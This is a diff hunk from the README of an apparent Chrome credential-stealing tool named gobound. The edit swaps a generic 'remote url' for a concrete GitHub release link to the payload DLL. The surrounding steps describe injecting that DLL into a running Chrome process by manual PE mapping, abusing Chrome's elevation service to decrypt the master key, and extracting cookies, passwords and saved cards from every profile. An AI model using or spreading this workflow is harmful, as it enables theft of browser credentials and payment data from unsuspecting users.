@@ -6,7 +6,7 @@ this works for V20 cookies/passwords (app bound encryption), for prior versions 
 ## what it does
 
 1. finds a running chrome process
-2. downloads a payload dll from a remote url
+2. downloads the payload dll from https://github.com/carved4/gobound/releases/download/v1.0.0/gobound.dll
 3. injects the dll into chrome using manual pe mapping (no loadlibrary)
 4. the dll uses chrome's elevation service to decrypt the master key
 5. extracts cookies, passwords, and saved cards from all chrome profiles
